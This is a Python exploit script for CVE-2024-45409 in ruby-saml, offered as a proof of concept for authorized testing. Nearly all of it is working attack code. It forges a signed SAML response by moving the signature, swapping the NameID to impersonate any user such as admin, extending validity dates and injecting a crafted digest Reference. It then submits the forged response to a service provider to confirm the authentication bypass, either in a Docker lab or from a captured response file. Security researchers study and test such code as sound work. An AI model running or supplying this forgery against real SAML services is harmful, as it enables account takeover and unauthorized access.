#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : ruby-saml SAML Authentication Bypass (XML Signature Wrapping)
# CVE            : CVE-2024-45409
# Vendor         : SAML-Toolkits / OneLogin
# Product        : ruby-saml
# Affected       : 1.13.0 – 1.16.0, <= 1.12.2
# Type           : CWE-347 - Improper Verification of Cryptographic Signature
# CVSS           : 10.0 (Critical)
# Platform       : Any (Ruby / SAML)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2024-09-10
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2024-45409 — ruby-saml XML Signature Wrapping Authentication Bypass

Demonstrates an XSW attack against ruby-saml <= 1.16.0. The vulnerable code
uses document-global XPath selectors (//ds:Reference) instead of context-relative
selectors (./ds:Reference), allowing injection of a crafted Reference element.

ATTACK CHAIN:
  1. Obtain a legitimately signed SAML Response (even expired)
  2. Forge the response: move Signature into Assertion, change NameID,
     inject crafted Reference in StatusDetail with recomputed digest
  3. Submit forged response to SP — authentication bypass confirmed

PREREQUISITES:
  - A legitimately signed SAML Response from the target IdP
  - Python 3 with lxml library (pip install lxml)

REFERENCES:
  - CVE-2024-45409
  - https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2
  - https://github.com/synacktiv/CVE-2024-45409
"""

import argparse
import hashlib
import os
import subprocess
import sys
import urllib.request
import urllib.parse
from base64 import b64encode, b64decode
from copy import deepcopy
from datetime import datetime, timedelta, timezone
from uuid import uuid4

try:
    from lxml import etree
except ImportError:
    print("[!] lxml is required: pip install lxml", file=sys.stderr)
    sys.exit(1)


# XML Namespace constants
NAMESPACES = {
    "ds": "http://www.w3.org/2000/09/xmldsig#",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
}

DSIG = "http://www.w3.org/2000/09/xmldsig#"
SAML = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"


def log(msg, level="*"):
    """Print a log message to stderr."""
    print(f"[{level}] {msg}", file=sys.stderr)


def remove_element_preserve_tail(element):
    """
    Remove an XML element from its parent while preserving its 'tail' text.

    In lxml, whitespace between elements is stored as the 'tail' property of
    the preceding element. If we naively call parent.remove(element), the tail
    text is lost, which changes the canonical form of the document. This causes
    digest mismatches when the same document is canonicalized by Nokogiri (Ruby)
    vs lxml (Python).

    This function preserves the tail by appending it to the previous sibling's
    tail (or the parent's text if there is no previous sibling).
    """
    parent = element.getparent()
    if parent is None:
        return

    prev = element.getprevious()
    tail = element.tail or ""

    if prev is not None:
        prev.tail = (prev.tail or "") + tail
    else:
        parent.text = (parent.text or "") + tail

    parent.remove(element)


def get_digest_function(algorithm_uri):
    """Map XML digest algorithm URI to hashlib function."""
    algo_map = {
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256,
        "sha384": hashlib.sha384,
        "sha512": hashlib.sha512,
    }
    # Extract algorithm name from URI (e.g., "...#sha256" -> "sha256")
    algo_name = algorithm_uri.split("#")[-1].lower()
    for name, func in algo_map.items():
        if name in algo_name:
            return func
    raise ValueError(f"Unsupported digest algorithm: {algorithm_uri}")


def forge_saml_response(input_xml, target_name_id, id_prefix="pfx"):
    """
    Perform the CVE-2024-45409 XML Signature Wrapping attack.

    Takes a legitimately signed SAML Response and produces a forged response
    that will authenticate as target_name_id on a vulnerable SP.

    Args:
        input_xml: Raw XML bytes of a legitimate SAML Response
        target_name_id: The NameID to impersonate (e.g., "admin@example.com")
        id_prefix: Prefix for generated IDs

    Returns:
        Forged SAML Response as XML bytes
    """
    doc = etree.fromstring(input_xml)

    # ── Step 1: Locate the Signature and extract signing metadata ──
    signature = doc.find(".//ds:Signature", namespaces=NAMESPACES)
    if signature is None:
        raise ValueError("No <ds:Signature> found in input SAML Response")

    # Get the Reference URI (points to the signed element's ID)
    ref_in_sig = signature.find(".//ds:Reference", namespaces=NAMESPACES)
    if ref_in_sig is None:
        raise ValueError("No <ds:Reference> found in Signature")
    ref_uri = ref_in_sig.get("URI")
    assertion_id = ref_uri.lstrip("#")
    log(f"Original Reference URI: {ref_uri}")

    # Extract digest algorithm from the legitimate signature
    digest_method_el = ref_in_sig.find("ds:DigestMethod", namespaces=NAMESPACES)
    digest_algorithm_uri = digest_method_el.get("Algorithm")
    log(f"Digest algorithm: {digest_algorithm_uri}")

    # Extract canonicalization algorithm from transforms
    transforms = ref_in_sig.findall(".//ds:Transform", namespaces=NAMESPACES)
    canon_algorithm = None
    for t in transforms:
        alg = t.get("Algorithm")
        if "c14n" in alg.lower():
            canon_algorithm = alg
    log(f"Canonicalization: {canon_algorithm}")

    # ── Step 2: Remove Signature from its current position ──
    sig_parent_tag = signature.getparent().tag
    log(f"Signature parent: {sig_parent_tag}")
    # Store a deep copy of the signature before removal
    signature_copy = deepcopy(signature)
    remove_element_preserve_tail(signature)

    # ── Step 3: Change the Response's ID to prevent replay detection ──
    new_response_id = f"{id_prefix}{uuid4().hex}"
    doc.set("ID", new_response_id)
    log(f"New Response ID: {new_response_id}")

    # ── Step 4: Find the Assertion and set its ID to match the Reference URI ──
    assertion = doc.find(".//saml:Assertion", namespaces=NAMESPACES)
    if assertion is None:
        raise ValueError("No <saml:Assertion> found in SAML Response")
    original_assertion_id = assertion.get("ID")
    assertion.set("ID", assertion_id)
    log(f"Assertion ID: {original_assertion_id} -> {assertion_id}")

    # ── Step 5: Change the NameID to impersonate the target user ──
    name_id_el = assertion.find(".//saml:NameID", namespaces=NAMESPACES)
    if name_id_el is None:
        raise ValueError("No <saml:NameID> found in Assertion")
    original_name_id = name_id_el.text
    name_id_el.text = target_name_id
    log(f"NameID: {original_name_id} -> {target_name_id}")

    # ── Step 6: Extend all temporal conditions to future dates ──
    now = datetime.now(tz=timezone.utc)
    not_before = (now - timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
    not_on_or_after = (now + timedelta(days=1)).strftime("%Y-%m-%dT%H:%M:%SZ")

    for el in assertion.findall(".//saml:SubjectConfirmationData", namespaces=NAMESPACES):
        if el.get("NotOnOrAfter"):
            el.set("NotOnOrAfter", not_on_or_after)
    for el in assertion.findall(".//saml:Conditions", namespaces=NAMESPACES):
        if el.get("NotBefore"):
            el.set("NotBefore", not_before)
        if el.get("NotOnOrAfter"):
            el.set("NotOnOrAfter", not_on_or_after)
    for el in assertion.findall(".//saml:AuthnStatement", namespaces=NAMESPACES):
        if el.get("SessionNotOnOrAfter"):
            el.set("SessionNotOnOrAfter", not_on_or_after)
    log(f"Extended temporal conditions: NotBefore={not_before}, NotOnOrAfter={not_on_or_after}")

    # ── Step 7: Compute digest of the MODIFIED assertion ──
    # ruby-saml applies the enveloped-signature transform (removes <ds:Signature>)
    # then canonicalizes the assertion. Since we haven't inserted the signature yet,
    # the assertion is already in the correct state for digest computation.
    #
    # CRITICAL: We canonicalize the assertion IN PLACE in the document tree to
    # preserve the correct namespace context. This produces identical output to
    # Nokogiri's exclusive C14N, unlike creating a detached copy.
    if canon_algorithm and "exc-c14n" in canon_algorithm.lower():
        canon_assertion = etree.tostring(
            assertion, method="c14n", exclusive=True, with_comments=False
        )
    else:
        canon_assertion = etree.tostring(
            assertion, method="c14n", exclusive=False, with_comments=False
        )

    digest_func = get_digest_function(digest_algorithm_uri)
    new_digest = b64encode(digest_func(canon_assertion).digest()).decode()
    log(f"Recomputed digest: {new_digest}")

    # ── Step 8: Insert Signature into the Assertion (after Issuer) ──
    # This is where the signature "lives" in the forged response.
    #
    # CRITICAL WHITESPACE HANDLING:
    # When ruby-saml verifies, it removes the Signature with Nokogiri and then
    # canonicalizes. Nokogiri (libxml2) represents inter-element whitespace as
    # separate text nodes. If there's whitespace BEFORE the Signature (e.g., as
    # Issuer's tail text), removing the Signature leaves that whitespace as an
    # orphan text node, creating DOUBLE whitespace between Issuer and Subject.
    #
    # To ensure our pre-computed digest matches, we must insert the Signature
    # with NO preceding whitespace — only a trailing whitespace (its tail in
    # lxml terms). This way, removing the Signature leaves exactly the same
    # whitespace we computed the digest over.
    issuer = assertion.find("saml:Issuer", namespaces=NAMESPACES)
    if issuer is not None:
        # Save the whitespace that should appear between Issuer and Subject
        original_tail = issuer.tail or ""
        # Remove whitespace before Signature (Issuer's tail becomes empty)
        issuer.tail = ""
        # Insert Signature after Issuer
        issuer_idx = list(assertion).index(issuer)
        assertion.insert(issuer_idx + 1, signature_copy)
        # Signature's tail = the whitespace before Subject
        # When ruby-saml removes the Signature, this tail becomes Issuer's
        # next text node, producing the exact same canonical form
        signature_copy.tail = original_tail
    else:
        assertion.insert(0, signature_copy)
    log("Moved Signature into Assertion (after Issuer)")

    # ── Step 9: Inject malicious <ds:Reference> in <samlp:StatusDetail> ──
    # This is THE EXPLOIT: the injected Reference appears BEFORE the legitimate
    # Reference in document order. The vulnerable //ds:Reference XPath in
    # ruby-saml finds THIS reference first, causing the digest check to use
    # the attacker's recomputed digest instead of the original one.
    status = doc.find(".//samlp:Status", namespaces=NAMESPACES)
    status_code = status.find("samlp:StatusCode", namespaces=NAMESPACES)

    # Build the malicious StatusDetail with injected Reference
    mal_xml = (
        f'<samlp:StatusDetail xmlns:samlp="{SAMLP}">'
        f'<ds:Reference xmlns:ds="{DSIG}" URI="#{assertion_id}">'
        f"<ds:Transforms>"
        f'<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
        f'<ds:Transform Algorithm="{canon_algorithm}"/>'
        f"</ds:Transforms>"
        f'<ds:DigestMethod Algorithm="{digest_algorithm_uri}"/>'
        f"<ds:DigestValue>{new_digest}</ds:DigestValue>"
        f"</ds:Reference>"
        f"</samlp:StatusDetail>"
    )
    status_detail = etree.fromstring(mal_xml)
    sc_idx = list(status).index(status_code)
    status.insert(sc_idx + 1, status_detail)
    log("Injected malicious <ds:Reference> in <samlp:StatusDetail>")

    # ── Step 10: Return the forged response ──
    forged_xml = etree.tostring(doc, xml_declaration=True, encoding="UTF-8")
    log("Forged SAML Response generated successfully")

    return forged_xml


def generate_legitimate_response(container_name, user_email, output_path):
    """
    Generate a legitimately signed SAML response using the mock IdP.
    This simulates the attacker obtaining a valid SAML response.
    """
    log(f"Generating legitimate SAML response for {user_email}")
    result = subprocess.run(
        [
            "docker", "exec", container_name,
            "ruby", "/app/mock_idp.rb", user_email, output_path,
        ],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        raise RuntimeError(f"Failed to generate SAML response: {result.stderr}")
    log(f"Mock IdP output: {result.stderr.strip()}")

    # Read back the generated response
    result = subprocess.run(
        ["docker", "exec", container_name, "cat", output_path],
        capture_output=True,
    )
    if result.returncode != 0:
        raise RuntimeError(f"Failed to read SAML response from container")
    return result.stdout


def submit_saml_response_raw(target_host, target_port, xml_bytes):
    """Submit a raw XML SAML Response to the SP's ACS endpoint."""
    url = f"http://{target_host}:{target_port}/saml/acs_raw"
    req = urllib.request.Request(
        url,
        data=xml_bytes,
        headers={"Content-Type": "application/xml"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, str(e)


def submit_saml_response_b64(target_host, target_port, xml_bytes):
    """Submit a base64-encoded SAML Response via standard POST binding."""
    url = f"http://{target_host}:{target_port}/saml/acs"
    b64_response = b64encode(xml_bytes).decode()
    body = urllib.parse.urlencode({"SAMLResponse": b64_response}).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, str(e)


def run_full_exploit(args):
    """
    Execute the complete CVE-2024-45409 attack chain:
    1. Generate a legitimate SAML response (simulates obtaining one)
    2. Forge the response to impersonate the target user
    3. Submit both legitimate and forged responses to the SP
    4. Verify the authentication bypass
    """
    container = args.container
    target_host = args.target_host
    target_port = args.target_port
    target_user = args.target_user
    source_user = args.source_user

    print("=" * 70)
    print("  CVE-2024-45409: ruby-saml XML Signature Wrapping PoC")
    print("  SAML Authentication Bypass — Impersonate Any User")
    print("=" * 70)
    print()

    # ── Phase 1: Obtain a legitimate SAML response ──
    print("[PHASE 1] Obtaining a legitimate SAML response")
    print(f"  Source user: {source_user}")
    print(f"  Container:   {container}")
    print()

    legit_xml = generate_legitimate_response(
        container, source_user, "/app/poc_legitimate.xml"
    )
    log(f"Legitimate response size: {len(legit_xml)} bytes")

    # Verify the legitimate response works
    print("[PHASE 1] Verifying legitimate response against SP...")
    status, body = submit_saml_response_raw(target_host, target_port, legit_xml)
    print(f"  HTTP {status}: {body}")
    if status == 200 and '"authenticated"' in body:
        print(f"  [OK] Legitimate auth as {source_user} confirmed")
    else:
        print(f"  [!] Legitimate auth failed — check lab setup")
        print(f"      SP may not be reachable at {target_host}:{target_port}")
        return False
    print()

    # ── Phase 2: Forge the SAML response ──
    print(f"[PHASE 2] Forging SAML response to impersonate: {target_user}")
    print()

    forged_xml = forge_saml_response(legit_xml, target_user)

    # Save the forged response for inspection
    output_path = args.output
    if output_path:
        with open(output_path, "wb") as f:
            f.write(forged_xml)
        log(f"Forged response saved to: {output_path}")
    print()

    # ── Phase 3: Submit the forged response (raw XML) ──
    print("[PHASE 3] Submitting forged response to SP (raw XML endpoint)")
    print(f"  Target: http://{target_host}:{target_port}/saml/acs_raw")
    print()

    status, body = submit_saml_response_raw(target_host, target_port, forged_xml)
    print(f"  HTTP {status}: {body}")
    print()

    if status == 200 and '"authenticated"' in body and target_user in body:
        print("=" * 70)
        print(f"  [VULNERABLE] Authentication bypass CONFIRMED!")
        print(f"  Authenticated as: {target_user}")
        print(f"  Original user was: {source_user}")
        print("=" * 70)

        # ── Phase 4: Also test via standard POST binding ──
        print()
        print("[PHASE 4] Verifying via standard SAML POST binding (base64-encoded)")
        print(f"  Target: http://{target_host}:{target_port}/saml/acs")
        status2, body2 = submit_saml_response_b64(target_host, target_port, forged_xml)
        print(f"  HTTP {status2}: {body2}")
        if status2 == 200 and target_user in body2:
            print(f"  [OK] POST binding also vulnerable")
        print()
        return True
    else:
        print("=" * 70)
        print(f"  [FAILED] Authentication bypass did NOT succeed")
        print(f"  Expected authenticated as {target_user}, got: {body}")
        print("=" * 70)
        return False


def run_forge_only(args):
    """Forge a SAML response from a file (offline mode)."""
    print(f"[*] Reading input: {args.input}")
    with open(args.input, "rb") as f:
        input_xml = f.read()

    # Handle base64-encoded input
    if args.decode:
        input_xml = b64decode(urllib.parse.unquote(input_xml.decode()))

    print(f"[*] Forging response as: {args.target_user}")
    forged_xml = forge_saml_response(input_xml, args.target_user)

    output = args.output or "forged_response.xml"
    if args.encode:
        forged_data = urllib.parse.quote(b64encode(forged_xml).decode())
        with open(output, "w") as f:
            f.write(forged_data)
    else:
        with open(output, "wb") as f:
            f.write(forged_xml)

    print(f"[+] Forged response written to: {output}")

    # If target host is specified, also submit
    if args.target_host:
        print(f"\n[*] Submitting to http://{args.target_host}:{args.target_port}/saml/acs_raw")
        status, body = submit_saml_response_raw(args.target_host, args.target_port, forged_xml)
        print(f"  HTTP {status}: {body}")
        if status == 200 and args.target_user in body:
            print(f"\n[VULNERABLE] Authenticated as {args.target_user}!")
            return True
    return True


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-45409: ruby-saml SAML Signature Wrapping PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full end-to-end exploit against lab:
  %(prog)s --target-host 172.19.0.8 --target-user admin@example.com

  # Forge an existing SAML response file:
  %(prog)s --input legitimate.xml --target-user admin@example.com --output forged.xml

  # Forge and submit:
  %(prog)s --input legitimate.xml --target-user admin@example.com --target-host 172.19.0.8
        """,
    )

    parser.add_argument(
        "--target-host", "-H",
        help="SP host IP/hostname (default: auto-detect from container)",
    )
    parser.add_argument(
        "--target-port", "-P",
        type=int, default=4567,
        help="SP port (default: 4567)",
    )
    parser.add_argument(
        "--target-user", "-u",
        default="admin@example.com",
        help="NameID to impersonate (default: admin@example.com)",
    )
    parser.add_argument(
        "--source-user", "-s",
        default="user@example.com",
        help="Source user for generating legitimate response (default: user@example.com)",
    )
    parser.add_argument(
        "--container", "-c",
        default="cve-2024-45409-vulnerable",
        help="Docker container name for the lab (default: cve-2024-45409-vulnerable)",
    )
    parser.add_argument(
        "--input", "-i",
        help="Input SAML response file (skip generation, forge from file)",
    )
    parser.add_argument(
        "--output", "-o",
        default="forged_response.xml",
        help="Output file for forged response",
    )
    parser.add_argument(
        "--decode", "-d",
        action="store_true",
        help="Decode base64+URL input before processing",
    )
    parser.add_argument(
        "--encode", "-e",
        action="store_true",
        help="Encode output as base64+URL",
    )

    args = parser.parse_args()

    # Auto-detect container IP if not specified
    if not args.target_host:
        try:
            result = subprocess.run(
                [
                    "docker", "inspect", args.container,
                    "--format",
                    "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}",
                ],
                capture_output=True, text=True,
            )
            ips = result.stdout.strip().split()
            if ips:
                args.target_host = ips[-1]  # Use last IP (usually the external network)
                log(f"Auto-detected SP IP: {args.target_host}")
            else:
                print("[!] Cannot detect container IP. Use --target-host.", file=sys.stderr)
                sys.exit(1)
        except Exception as e:
            print(f"[!] Cannot detect container IP: {e}. Use --target-host.", file=sys.stderr)
            sys.exit(1)

    # Decide execution mode
    if args.input:
        # Forge from file
        success = run_forge_only(args)
    else:
        # Full end-to-end exploit
        success = run_full_exploit(args)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
